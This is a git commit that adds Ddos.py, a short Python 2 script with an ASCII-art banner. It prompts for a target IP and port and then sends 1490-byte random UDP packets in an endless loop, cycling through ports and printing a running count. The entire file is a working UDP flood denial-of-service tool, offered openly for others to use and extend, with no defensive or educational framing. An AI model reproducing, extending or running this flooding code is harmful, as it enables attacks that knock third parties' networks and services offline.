95d3e413b88bd7fe7af5eac82e9f5524c85ecbda
MrT4X <51880140+MrT4X@users.noreply.github.com>
2019-06-16 19:44:33 +0700

    Add files via upload

---
+++ Ddos.py
@@ -0,0 +1,37 @@
+#Codec by Mr.yM
+#silahkan klean kreasikan/kembangkan sendiri :D
+
+import os
+import sys
+import socket
+import random
+
+#SET SOCK AND RANDOM
+##########################################################
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) ##
+bytes = random._urandom(1490)                           ##
+##########################################################
+
+os.system("clear")
+print
+print "\033[37;1m			>//< Author Mr.yM >//<                      "
+print
+print "    _  _  _  _                _                                  "
+print "   (_)(_)(_)(_)              (_)                                 "
+print "    (_)      (_)_    _  _  _ (_)    _  _  _       _  _  _  _     "
+print "    (_)        (_) _(_)(_)(_)(_) _ (_)(_)(_) _  _(_)(_)(_)(_)    "
+print "    (_)        (_)(_)        (_)(_)         (_)(_)_  _  _  _     "
+print "    (_)       _(_)(_)        (_)(_)         (_)  (_)(_)(_)(_)_   "
+print "    (_)_  _  (_)  (_)_  _  _ (_)(_) _  _  _ (_)   _  _  _  _(_)  "
+print "   (_)(_)(_)(_)     (_)(_)(_)(_)   (_)(_)(_)     (_)(_)(_)(_)    "
+print
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "\033[32;1mSent %s packet to %s sampe down port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
